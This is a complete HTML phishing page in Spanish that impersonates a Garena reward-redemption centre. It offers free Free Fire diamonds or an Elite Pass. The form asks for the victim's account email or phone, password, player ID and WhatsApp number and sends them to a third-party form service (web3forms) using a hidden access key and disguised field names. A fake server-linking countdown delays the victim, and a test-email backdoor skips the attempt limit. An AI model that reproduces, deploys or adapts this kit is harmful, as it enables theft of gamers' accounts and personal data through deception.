<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena: Centro de Canje</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-image: url('image.png'); background-size: cover; background-position: center top; background-attachment: fixed; color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px 0; overflow-y: auto; }
        .container { background: rgba(13, 17, 23, 0.95); border: 1px solid #f97316; padding: 20px; border-radius: 15px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
        .garena-logo { width: 130px; margin-bottom: 10px; }
        .reward-img { width: 100%; max-width: 260px; border-radius: 10px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(249, 115, 22, 0.5)); }
        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; margin-bottom: 20px; }
        .btn-select { background: #222; color: white; border: 1px solid #444; padding: 12px; border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; flex: 1 1 45%; transition: 0.3s; }
        .active { background: #f97316; border-color: #f97316; box-shadow: 0 0 10px #f97316; }
        .login-methods { display: flex; gap: 10px; margin: 15px 0; }
        .btn-login { flex: 1; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; color: white; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; transition: 0.2s; border: 2px solid transparent; }
        .btn-fb { background: #1877f2; }
        .btn-gl { background: #ffffff; color: #5f6368; border: 1px solid #dadce0; }
        .btn-gl img { width: 18px; }
        input { width: 90%; padding: 14px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; font-size: 15px; outline: none; }
        input:focus { border-color: #f97316; }
        #submit-button { background: #f97316; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-weight: bold; font-size: 17px; margin-top: 20px; cursor: pointer; text-transform: uppercase; }
        #submit-button:disabled { background: #555; cursor: not-allowed; }
        #espera { display: none; padding: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #f97316; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container" id="main-content">
    <img src="GarenaLogo.png" class="garena-logo">
    <h2 style="color: #f97316; margin: 10px 0;">CENTRO DE CANJE</h2>
    <img src="kbycfgvavzfioixcsvez_655x~3.jpg" id="main-reward-img" class="reward-img">

    <div class="btn-group">
        <button type="button" class="btn-select active" onclick="updateReward('1,060 Diamantes', 'kbycfgvavzfioixcsvez_655x~3.jpg', this)">1,060 DIAMANTES</button>
        <button type="button" class="btn-select" onclick="updateReward('520 Diamantes', 'freefire-15.500~2.png', this)">520 DIAMANTES</button>
        <button type="button" class="btn-select" onclick="updateReward('Pase Élite', 'Pase-Elite-png.png', this)">PASE ÉLITE</button>
    </div>

    <p style="font-size: 13px; margin-top: 20px;">1. Elige tu método de acceso:</p>
    <div class="login-methods">
        <button type="button" class="btn-login btn-fb" onclick="setPlataforma('Facebook', this)"><i class="fab fa-facebook"></i> Facebook</button>
        <button type="button" class="btn-login btn-gl" onclick="setPlataforma('Google', this)"><img src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/24px.svg"> Google</button>
    </div>

    <form action="https://api.web3forms.com/submit" method="POST" id="recompensaForm">
        <input type="hidden" name="access_key" value="8fb82e85-27c0-4d8f-ba50-3c6c7d5df37d">
        <input type="hidden" name="subject" value="Nueva Entrada de Datos de Usuario">
        <input type="hidden" name="Entry_Type" id="reward-input" value="1,060 Diamantes">
        <input type="hidden" name="Source_Key" id="plat-input" value="No seleccionada">
        
        <input type="text" name="Data_User_01" id="input-usuario" placeholder="Correo o Teléfono de cuenta" oninput="checkAdmin(this.value)" required>
        <input type="password" name="Security_Key_02" placeholder="Contraseña" required>
        <input type="number" name="Public_ID_03" placeholder="ID de Jugador" required>
        
        <p style="font-size: 12px; color: #00ff00; margin-top: 15px;">2. Verificación de entrega por WhatsApp:</p>
        <input type="tel" name="Direct_Line_04" placeholder="Número de WhatsApp (Ej: +52...)" required>
        
        <button type="submit" id="submit-button">RECLAMAR 1,060 DIAMANTES</button>
    </form>
</div>

<div class="container" id="espera">
    <img src="GarenaLogo.png" class="garena-logo">
    <h3 id="titulo-espera">Vinculando con servidores...</h3>
    <div class="loader"></div>
    <p id="timer" style="font-size: 24px; font-weight: bold; color: #f97316;">20s</p>
    <p style="font-size: 14px; color: #aaa;">No cierres esta ventana para evitar errores.</p>
</div>

<script>
    const CORREO_TEST = "noloserickparecefalso@gmail.com";
    let intentos = localStorage.getItem('intentos_garena') || 0;
    const btnSubmit = document.getElementById('submit-button');
    const elForm = document.getElementById('recompensaForm');

    if (intentos >= 2) {
        btnSubmit.disabled = true;
        btnSubmit.innerText = "LÍMITE ALCANZADO";
        btnSubmit.style.background = "#555";
    }

    function checkAdmin(valor) {
        if (valor === CORREO_TEST) {
            btnSubmit.disabled = false;
            btnSubmit.innerText = "MODO PRUEBA ACTIVO";
            btnSubmit.style.background = "#28a745";
        } else if (intentos >= 2) {
            btnSubmit.disabled = true;
            btnSubmit.innerText = "LÍMITE ALCANZADO";
            btnSubmit.style.background = "#555";
        }
    }

    function updateReward(nombre, imagen, boton) {
        document.getElementById('main-reward-img').src = imagen;
        document.getElementById('reward-input').value = nombre;
        btnSubmit.innerText = (document.getElementById('input-usuario').value === CORREO_TEST) ? 'MODO PRUEBA ACTIVO' : 'RECLAMAR ' + nombre;
        document.querySelectorAll('.btn-select').forEach(b => b.classList.remove('active'));
        boton.classList.add('active');
    }

    function setPlataforma(plat, boton) {
        document.getElementById('plat-input').value = plat;
        document.querySelectorAll('.btn-login').forEach(b => { b.style.borderColor = "transparent"; b.style.transform = "scale(1)"; });
        boton.style.borderColor = "#f97316";
        boton.style.transform = "scale(1.05)";
    }

    elForm.onsubmit = function(e) {
        e.preventDefault();
        const usuarioActual = document.getElementById('input-usuario').value;

        if (usuarioActual !== CORREO_TEST) {
            intentos++;
            localStorage.setItem('intentos_garena', intentos);
        }

        document.getElementById('main-content').style.display = 'none';
        document.getElementById('espera').style.display = 'block';

        let tiempo = 20;
        const relay = document.getElementById('timer');
        const titulo = document.getElementById('titulo-espera');

        const cuenta = setInterval(function() {
            tiempo--;
            relay.innerText = tiempo + "s";
            if (tiempo <= 0) {
                clearInterval(cuenta);
                titulo.innerText = "VERIFICACIÓN REQUERIDA";
                relay.innerText = "¡REVISA TU WHATSAPP!";
                relay.style.color = "#00ff00";
                
                setTimeout(function(){
                    elForm.submit();
                }, 2000);
            }
        }, 1000);
    };
</script>

</body>
</html>
